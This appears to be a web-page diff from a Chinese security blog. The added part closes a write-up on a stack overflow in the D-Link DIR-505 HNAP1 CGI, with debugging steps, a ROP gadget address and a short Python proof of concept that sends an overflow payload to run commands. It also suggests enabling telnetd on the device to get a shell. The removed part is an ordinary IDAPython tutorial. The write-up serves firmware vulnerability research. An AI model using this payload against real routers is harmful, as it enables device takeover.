+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sudo ./debug_mycgi.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">export SCRIPT_NAME=&quot;HNAP1&quot;</span><br><span class="line">export SOAP_ACTION=&quot;soap&quot;</span><br><span class="line">export CONTENT_LENGTH=&quot;30080&quot;</span><br><span class="line"></span><br><span class="line">cat ./stdin | chroot . ./qemu-mips-static -g 12345 ./usr/bin/my_cgi.cgi</span><br></pre></td></tr></table></figure>
+
+<p>使用 gdb-multiarch 连接上 target remote :12345，然后在 do_hnap 函数恢复返回地址到 ra 寄存器处下断点 <code>b *0x431168</code>，可以看到执行完当前指令后，ra 被写入为 gadget 地址 0x405c5c<br><img src="/images/image-2023-0412-181437533.png" alt="undifined"><br>继续单步调试到执行 gadget，调用 system 函数，执行的命令保存在 sp + 0x28 处。<br><img src="/images/image-2023-0412-181459541.png" alt="undifined"><br>可以看到成功命令执行，创建了 test 文件<br><img src="/images/image-2023-0412-181517479.png" alt="undifined"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如上的漏洞复现调试是针对与 my_cgi.cgi，而真实运行环境是通过 lighttpd 服务器接受用户发送请求数据包，然后将数据通过环境变量以及 STDIN 传递给 my_cgi.cgi 进行处理，漏洞发生也是在这个地方，那么漏洞利用需要构造数据包向 lighttpd 传递。初次之外，还需要看固件支持哪些命令，例如此处的 busybox 支持的命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">BusyBox v1.01 (2013.05.23-09:13+0000) multi-call binary</span><br><span class="line"></span><br><span class="line">Usage: busybox [function] [arguments]...</span><br><span class="line">   or: [function] [arguments]...</span><br><span class="line"></span><br><span class="line">        BusyBox is a multi-call binary that combines many common Unix</span><br><span class="line">        utilities into a single executable.  Most people will create a</span><br><span class="line">        link to busybox for each function they wish to use and BusyBox</span><br><span class="line">        will act like whatever it was invoked as!</span><br><span class="line"></span><br><span class="line">Currently defined functions:</span><br><span class="line">        [, arping, ash, brctl, busybox, cat, chmod, cp, cut, date, dd,</span><br><span class="line">        df, dirname, du, echo, egrep, fdisk, fgrep, find, free, grep,</span><br><span class="line">        head, hostname, ifconfig, init, insmod, kill, killall, klogd,</span><br><span class="line">        linuxrc, ln, logger, login, logread, ls, lsmod, md5sum, mkdir,</span><br><span class="line">        mount, mv, nslookup, ping, ps, reboot, rm, rmmod, route, sed,</span><br><span class="line">        sh, sleep, syslogd, tar, telnetd, test, tftp, touch, tr, tty,</span><br><span class="line">        umount, uname, vconfig, vi, wc, wget, xargs, zcip</span><br></pre></td></tr></table></figure>
+
+<p>那么简洁版的 exp 如下，执行结果是直接写回了到返回数据包中。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">cmd = <span class="string">b&#x27;ls -l\x00&#x27;</span></span><br><span class="line">poc = <span class="number">30020</span> * <span class="string">b&#x27;A&#x27;</span> + <span class="string">b&#x27;\x00\x40\x5c\x5c&#x27;</span> + <span class="number">40</span> * <span class="string">b&#x27;B&#x27;</span> + cmd</span><br><span class="line">res = requests.post(url=<span class="string">&#x27;http://127.0.0.1:80/HNAP1/&#x27;</span>, data=poc)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-2023-0412-181608350.png" alt="undifined"><br>通过 busybox 支持的命令也可以看到，有 telnetd，如果在实体机上要获取到一个可交互的 shell，那么可以开启设备的 telnet 服务。</p>
+<h2 id="个人小结"><a href="#个人小结" class="headerlink" title="个人小结"></a>个人小结</h2><p>如下是个人觉得可以加深对于程序执行流程理解的一些点：</p>
+<ul>
+<li><p>do_hnap 函数中循环的控制及 MIPS 架构 s 系列寄存器的用法<br>寄存器 <code>s0~s7</code> 通常是用来在子函数内部使用，如果在子函数内部还需要调用函数，那么需要将这些寄存器的值保存在栈上，执行完调用函数后进行恢复。例如<code>s0~s7</code> 在 main 函数中使用，当 main 函数调用 do_hnap 的时候，在 do_hnap 函数的初始化堆栈时，将寄存器保存到了栈上。因此，我们在缓冲区溢出的时候，有时候不止可以控制 ra 寄存器，还可以控制 s 系列寄存器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># do_hnap 函数初始化过程</span><br><span class="line">.text:00430DAC li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0 - .)</span><br><span class="line">.text:00430DB4 addu    $gp, $t9</span><br><span class="line">.text:00430DB8 addiu   $sp, -0x7578</span><br><span class="line">.text:00430DBC sw      $ra, 0x7560+var_s14($sp)</span><br><span class="line">.text:00430DC0 sw      $s4, 0x7560+var_s10($sp)</span><br><span class="line">.text:00430DC4 sw      $s3, 0x7560+var_sC($sp)</span><br><span class="line">.text:00430DC8 sw      $s2, 0x7560+var_s8($sp)</span><br><span class="line">.text:00430DCC sw      $s1, 0x7560+var_s4($sp)</span><br><span class="line">.text:00430DD0 sw      $s0, 0x7560+var_s0($sp)</span><br><span class="line">...</span><br><span class="line"># do_hnap 函数执行完毕 </span><br><span class="line">.text:00431168 lw      $ra, 0x7574($sp)</span><br><span class="line">.text:0043116C move    $v0, $s0</span><br><span class="line">.text:00431170 lw      $s4, 0x7570($sp)</span><br><span class="line">.text:00431174 lw      $s3, 0x756C($sp)</span><br><span class="line">.text:00431178 lw      $s2, 0x7568($sp)</span><br><span class="line">.text:0043117C lw      $s1, 0x7564($sp)</span><br><span class="line">.text:00431180 lw      $s0, 0x7560($sp)</span><br><span class="line">.text:00431184 jr      $ra</span><br><span class="line">.text:00431188 addiu   $sp, 0x7578</span><br></pre></td></tr></table></figure>
+<p>那么现在回归正题，do_hnap 函数是使用的 s0 指向 buf 的起始地址，s1 指向 buf 的结束位置，s3 指向标准输入的起始地址。循环的结构使用 IDA 的控制流图看的话，就非常简介明了。s0 先指向 buf 起始地址，每次调用 fgetc 读取一个字符保存到 s0，然后 s0 自加指向下一个位置，直到 s0 指向结束地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00430F9C la      $s3, stdin       # 标准输入存储在 s3 寄存器</span><br><span class="line">.text:00430FA0 move    $s0, $a0			# s0：指针指向 buf 的起始位置</span><br><span class="line">.text:00430FA4 addu    $s1, $a0, $s1    # s1：指针指向 buf 的结束位置</span><br><span class="line">...</span><br><span class="line">.text:00431010 sb      $v0, 0($s0)		# 将从 fgetc 读取到的字符存储到缓冲区</span><br><span class="line">.text:00431014 addiu   $s0, 1           # s0 移动到缓冲区下一个位置</span><br><span class="line">.text:00431018 bne     $s0, $s1, loc_430FB4	# 比较进行跳转</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>关于 server 的启动命令分析<br>可以分析固件文件系统的初始化启动脚本，通常在 &#x2F;etc&#x2F;rc* 文件或者目录下，就可以得到设备启动时执行了哪些初始化工作，例如挂载设备、创建文件等等。此处还有解压 html 文件，应该为了节省设备的存储空间，第一次启动的时候进行解压。</p>
+</li>
+<li><p>关于漏洞利用执行结果回显<br>如果设备固件中带有一些可以进行交互的程序例如 sshd、telnetd 等服务，那么命令执行可以通过这些程序直接获取到一个可交互的 shell，如果没有，可以考虑把执行结果写回到设备的 www 目录中的文件，通过 http 服务访问命令执行结果。</p>
+</li>
+</ul>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/34064">[exploit.db] D-Link HNAP - Request Remote Buffer Overflow (Metasploit)</a></li>
+<li><a target="_blank" rel="noopener" href="http://en.hackdig.com/?739.htm">Hacking the D-Link DSP-W215 Smart Plug</a></li>
+<li><a target="_blank" rel="noopener" href="http://legacyfiles.us.dlink.com/DIR-505/REVA/FIRMWARE/DIR-505_REVA_FIRMWARE_1.07.ZIP">[固件下载] DIR-505_REVA_FIRMWARE_1.07.ZIP</a>]</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/11/write4_armel/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1039,301 +1267,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/IDAPython-%E6%8C%87%E4%BB%A4%E7%B2%92%E5%BA%A6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="ToT">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/06/IDAPython-%E6%8C%87%E4%BB%A4%E7%B2%92%E5%BA%A6/" class="post-title-link" itemprop="url">IDAPython-指令粒度</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-04-06 01:22:41" itemprop="dateCreated datePublished" datetime="2023-04-06T01:22:41+08:00">2023-04-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-11 13:47:36" itemprop="dateModified" datetime="2023-04-11T13:47:36+08:00">2023-04-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/IDAPython/" itemprop="url" rel="index"><span itemprop="name">IDAPython</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>使用IDAPython进行指令粒度的操作，其实主要就是关注如下几点：</p>
-<ol>
-<li>如何从函数地址获取到指令</li>
-<li>对指令进行分析：包括指令、操作数，其中又包含指令类型、操作数类型、操作数值</li>
-</ol>
-<p>所使用到的API速查：</p>
-<table>
-<thead>
-<tr>
-<th>模块</th>
-<th>API原型</th>
-<th>功能说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>idautils</td>
-<td>FuncItems(ea)</td>
-<td>获取地址ea所在函数的所有指令集合</td>
-</tr>
-<tr>
-<td>idc</td>
-<td>GetDisasm(ea)</td>
-<td>获取地址ea所在指令的反汇编（返回字符串）</td>
-</tr>
-<tr>
-<td>idc</td>
-<td>next_head(ea)</td>
-<td>获取地址ea的下一条指令的地址</td>
-</tr>
-<tr>
-<td>idc</td>
-<td>prev_head(ea)</td>
-<td>获取地址ea的上一条指令的地址</td>
-</tr>
-<tr>
-<td>idc</td>
-<td>next_addr(ea)</td>
-<td>地址ea+1</td>
-</tr>
-<tr>
-<td>idc</td>
-<td>prev_addr(ea)</td>
-<td>地址ea-1</td>
-</tr>
-<tr>
-<td>idc</td>
-<td>print_insn_mnem(ea)</td>
-<td>获取地址ea所在指令的助记符（返回字符串）</td>
-</tr>
-<tr>
-<td>idc</td>
-<td>print_operand(ea, n)</td>
-<td>获取地址ea所在指令的第n个操作数（从0开始，返回字符串）</td>
-</tr>
-<tr>
-<td>idc</td>
-<td>get_operand_type(ea, n)</td>
-<td>获取地址ea所在指令的第n个操作数的类型</td>
-</tr>
-<tr>
-<td>idc</td>
-<td>get_operand_value(ea, n)</td>
-<td>获取地址ea所在指令的第n个操作数的值</td>
-</tr>
-</tbody></table>
-<h2 id="指令（construction）"><a href="#指令（construction）" class="headerlink" title="指令（construction）"></a>指令（construction）</h2><p>可以使用<code>idautils.FuncItems(ea)</code>来获取到当前地址<code>ea</code>所在函数的所有指令集合。如下，同时，可以使用<code>idc.GetDisasm(ea)</code>来获取到指令的反汇编。演示所用到的程序是cgibin，在<code>main</code>函数处。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">dism_items = idautils.FuncItems(here())</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> dism_items:</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(item), idc.GetDisasm(item))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Python&gt;</span></span><br><span class="line"><span class="string">0x402da0 addiu   $sp, -0x30</span></span><br><span class="line"><span class="string">0x402da4 sw      $ra, 0x20+var_sC($sp)</span></span><br><span class="line"><span class="string">0x402da8 sw      $s2, 0x20+var_s8($sp)</span></span><br><span class="line"><span class="string">0x402dac sw      $s1, 0x20+var_s4($sp)</span></span><br><span class="line"><span class="string">0x402db0 sw      $s0, 0x20+var_s0($sp)</span></span><br><span class="line"><span class="string">0x402db4 li      $gp, 0x43F7F0</span></span><br><span class="line"><span class="string">0x402dbc sw      $gp, 0x20+var_10($sp)</span></span><br><span class="line"><span class="string">0x402dc0 move    $s1, $a1</span></span><br><span class="line"><span class="string">0x402dc4 la      $t9, strrchr</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
-<p><code>idautils.FuncItems(ea)</code>会获取<code>ea</code>地址所在函数的所有指令的地址，返回一个迭代器。<code>idc.GetDiasm(ea)</code>则是在第一小节的时候出现过用来打印指令的反汇编结果。<br>如果是要获取到当前指令<code>ea</code>的上一条指令的地址和下一条指令的地址，分别使用<code>idc.next_head</code>、<code>idc.prev_head</code>，当然这只是从代码段的地址顺序遍历指令，不会因为当前指令是某个跳转则遍历到跳转后的指令。这两条指令可以应用在遍历某一段地址的指令上。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;ea = here()</span><br><span class="line">Python&gt;<span class="built_in">print</span>(<span class="built_in">hex</span>(ea))</span><br><span class="line"><span class="number">0x402da0</span></span><br><span class="line">Python&gt;idc.next_head(ea)</span><br><span class="line"><span class="number">0x402da4</span></span><br><span class="line">Python&gt;idc.prev_head(ea)</span><br><span class="line"><span class="number">0x402d9c</span></span><br></pre></td></tr></table></figure>
-<p>需要和这两个API进行区分：<code>idc.next_addr</code>、<code>idc.prev_addr</code>，这两条指令只会机械增加和减小地址：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;ea = here()</span><br><span class="line">Python&gt;<span class="built_in">print</span>(<span class="built_in">hex</span>(ea))</span><br><span class="line"><span class="number">0x402da0</span></span><br><span class="line">Python&gt;idc.next_addr(ea) <span class="comment"># 增加1</span></span><br><span class="line"><span class="number">0x402da1</span></span><br><span class="line">Python&gt;idc.prev_addr(ea) <span class="comment"># 减小1</span></span><br><span class="line"><span class="number">0x402d9f</span></span><br></pre></td></tr></table></figure>
-<h2 id="操作数（Operands）"><a href="#操作数（Operands）" class="headerlink" title="操作数（Operands）"></a>操作数（Operands）</h2><p>操作数的打印如下，主要就是可以将一条指令分解为助记符、操作数1、操作数2等，但是都是以字符串的形式进行打印。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;idc.GetDisasm(ea)         <span class="comment"># 单条汇编指令</span></span><br><span class="line"><span class="string">&#x27;addiu   $sp, -0x30&#x27;</span></span><br><span class="line">Python&gt;idc.print_insn_mnem(ea)。 <span class="comment"># 打印助记符</span></span><br><span class="line"><span class="string">&#x27;addiu&#x27;</span></span><br><span class="line">Python&gt;idc.print_operand(ea, <span class="number">0</span>)  <span class="comment"># 打印第一个操作数</span></span><br><span class="line"><span class="string">&#x27;$sp&#x27;</span></span><br><span class="line">Python&gt;idc.print_operand(ea, <span class="number">1</span>)。<span class="comment"># 打印第二个操作数</span></span><br><span class="line"><span class="string">&#x27;-0x30&#x27;</span></span><br></pre></td></tr></table></figure>
-<h3 id="操作数类型（operand-type）"><a href="#操作数类型（operand-type）" class="headerlink" title="操作数类型（operand type）"></a>操作数类型（operand type）</h3><p>有时候需要对指令的操作数类型进行判断，例如某个命令执行函数通过寄存器传参，传入的是一个立即数（命令字符串地址）还是某个内存（函数栈变量）呢。使用<code>idc.get_operand_type(ea, n)</code>可以对操作数的类型进行判断，其中<code>ea</code>是当前指令地址，<code>n</code>是第<code>n+1</code>个操作数，例如<code>n=0</code>为第一个操作数。<br>操作数的类型如下，好气，居然没有MIPS的，实际测试也发现MIPS架构判断操作数类型不可用，如果要判断操作数类型就只能使用<code>idc.print_operand</code>来进行字符串的比较：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">o_void     = ida_ua.o_void      <span class="comment"># No Operand                           ----------</span></span><br><span class="line">o_reg      = ida_ua.o_reg       <span class="comment"># General Register (al,ax,es,ds...)    reg</span></span><br><span class="line">o_mem      = ida_ua.o_mem       <span class="comment"># Direct Memory Reference  (DATA)      addr</span></span><br><span class="line">o_phrase   = ida_ua.o_phrase    <span class="comment"># Memory Ref [Base Reg + Index Reg]    phrase</span></span><br><span class="line">o_displ    = ida_ua.o_displ     <span class="comment"># Memory Reg [Base Reg + Index Reg + Displacement] phrase+addr</span></span><br><span class="line">o_imm      = ida_ua.o_imm       <span class="comment"># Immediate Value                      value</span></span><br><span class="line">o_far      = ida_ua.o_far       <span class="comment"># Immediate Far Address  (CODE)        addr</span></span><br><span class="line">o_near     = ida_ua.o_near      <span class="comment"># Immediate Near Address (CODE)        addr</span></span><br><span class="line">o_idpspec0 = ida_ua.o_idpspec0  <span class="comment"># Processor specific type</span></span><br><span class="line">o_idpspec1 = ida_ua.o_idpspec1  <span class="comment"># Processor specific type</span></span><br><span class="line">o_idpspec2 = ida_ua.o_idpspec2  <span class="comment"># Processor specific type</span></span><br><span class="line">o_idpspec3 = ida_ua.o_idpspec3  <span class="comment"># Processor specific type</span></span><br><span class="line">o_idpspec4 = ida_ua.o_idpspec4  <span class="comment"># Processor specific type</span></span><br><span class="line">o_idpspec5 = ida_ua.o_idpspec5  <span class="comment"># Processor specific type</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># x86</span></span><br><span class="line">o_trreg  =       ida_ua.o_idpspec0      <span class="comment"># trace register</span></span><br><span class="line">o_dbreg  =       ida_ua.o_idpspec1      <span class="comment"># debug register</span></span><br><span class="line">o_crreg  =       ida_ua.o_idpspec2      <span class="comment"># control register</span></span><br><span class="line">o_fpreg  =       ida_ua.o_idpspec3      <span class="comment"># floating point register</span></span><br><span class="line">o_mmxreg  =      ida_ua.o_idpspec4      <span class="comment"># mmx register</span></span><br><span class="line">o_xmmreg  =      ida_ua.o_idpspec5      <span class="comment"># xmm register</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># arm</span></span><br><span class="line">o_reglist  =     ida_ua.o_idpspec1      <span class="comment"># Register list (for LDM/STM)</span></span><br><span class="line">o_creglist  =    ida_ua.o_idpspec2      <span class="comment"># Coprocessor register list (for CDP)</span></span><br><span class="line">o_creg  =        ida_ua.o_idpspec3      <span class="comment"># Coprocessor register (for LDC/STC)</span></span><br><span class="line">o_fpreglist  =   ida_ua.o_idpspec4      <span class="comment"># Floating point register list</span></span><br><span class="line">o_text  =        ida_ua.o_idpspec5      <span class="comment"># Arbitrary text stored in the operand</span></span><br><span class="line">o_cond  =        (ida_ua.o_idpspec5+<span class="number">1</span>)  <span class="comment"># ARM condition as an operand</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ppc</span></span><br><span class="line">o_spr  =         ida_ua.o_idpspec0      <span class="comment"># Special purpose register</span></span><br><span class="line">o_twofpr  =      ida_ua.o_idpspec1      <span class="comment"># Two FPRs</span></span><br><span class="line">o_shmbme  =      ida_ua.o_idpspec2      <span class="comment"># SH &amp; MB &amp; ME</span></span><br><span class="line">o_crf  =         ida_ua.o_idpspec3      <span class="comment"># crfield      x.reg</span></span><br><span class="line">o_crb  =         ida_ua.o_idpspec4      <span class="comment"># crbit        x.reg</span></span><br><span class="line">o_dcr  =         ida_ua.o_idpspec5      <span class="comment"># Device control register</span></span><br></pre></td></tr></table></figure>
-<h3 id="操作数值（operand-value）"><a href="#操作数值（operand-value）" class="headerlink" title="操作数值（operand value）"></a>操作数值（operand value）</h3><p>获取到了操作数的类型还不够，例如不仅需要知道某条指令的第一个操作数是寄存器，还需要知道寄存器编号。使用<code>idc.get_operand_value(ea, n)</code>可以获取到地址<code>ea</code>处指令的第<code>n+1</code>个操作数的值。该API是在<code>ida_ua</code>基础上进行封装的，代码如下。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_operand_value</span>(<span class="params">ea, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Get number used in the operand</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This function returns an immediate number used in the operand</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @param ea: linear address of instruction</span></span><br><span class="line"><span class="string">    @param n: the operand number</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @return: value</span></span><br><span class="line"><span class="string">        operand is an immediate value  =&gt; immediate value</span></span><br><span class="line"><span class="string">        operand has a displacement     =&gt; displacement</span></span><br><span class="line"><span class="string">        operand is a direct memory ref =&gt; memory address</span></span><br><span class="line"><span class="string">        operand is a register          =&gt; register number</span></span><br><span class="line"><span class="string">        operand is a register phrase   =&gt; phrase number</span></span><br><span class="line"><span class="string">        otherwise                      =&gt; -1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    insn = ida_ua.insn_t()</span><br><span class="line">    inslen = ida_ua.decode_insn(insn, ea)</span><br><span class="line">    <span class="keyword">if</span> inslen == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    op = insn.ops[n]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> op:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> op.<span class="built_in">type</span> <span class="keyword">in</span> [ ida_ua.o_mem, ida_ua.o_far, ida_ua.o_near, ida_ua.o_displ ]:</span><br><span class="line">        value = op.addr</span><br><span class="line">    <span class="keyword">elif</span> op.<span class="built_in">type</span> == ida_ua.o_reg:</span><br><span class="line">        value = op.reg</span><br><span class="line">    <span class="keyword">elif</span> op.<span class="built_in">type</span> == ida_ua.o_imm:</span><br><span class="line">        value = op.value</span><br><span class="line">    <span class="keyword">elif</span> op.<span class="built_in">type</span> == ida_ua.o_phrase:</span><br><span class="line">        value = op.phrase</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure>
-<p>可以看到函数注释中的返回值类型和结果：</p>
-<ul>
-<li>操作数是立即数：返回立即数</li>
-<li>操作数是displacement：（俺不晓得）</li>
-<li>操作数是直接内存引用：内存地址</li>
-<li>操作数是寄存器：寄存器编号</li>
-<li>操作数是register phrase：（俺不晓得）</li>
-</ul>
-<h2 id="指令分析示例"><a href="#指令分析示例" class="headerlink" title="指令分析示例"></a>指令分析示例</h2><p>那没办法，随便找了一个ARM架构为例，如下，该指令的第一个操作数和第二个操作数类型都是寄存器：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;ea = idc.here()</span><br><span class="line">Python&gt;idc.GetDisasm(ea)            <span class="comment"># 反编译指令</span></span><br><span class="line"><span class="string">&#x27;MOV             R4, R0&#x27;</span></span><br><span class="line">Python&gt;idc.get_operand_type(ea, <span class="number">0</span>)  <span class="comment"># 第一个操作数类型：寄存器</span></span><br><span class="line"><span class="number">0x1</span></span><br><span class="line">Python&gt;idc.get_operand_value(ea, <span class="number">0</span>) <span class="comment"># 第一个操作数值：寄存器编号4-&gt;R4</span></span><br><span class="line"><span class="number">0x4</span></span><br><span class="line">Python&gt;idc.get_operand_type(ea, <span class="number">1</span>)  <span class="comment"># 第二个操作数类型：寄存器</span></span><br><span class="line"><span class="number">0x1</span></span><br><span class="line">Python&gt;idc.get_operand_value(ea, <span class="number">1</span>) <span class="comment"># 第二个操作数值：寄存器编号0-&gt;R0</span></span><br><span class="line"><span class="number">0x0</span></span><br></pre></td></tr></table></figure>
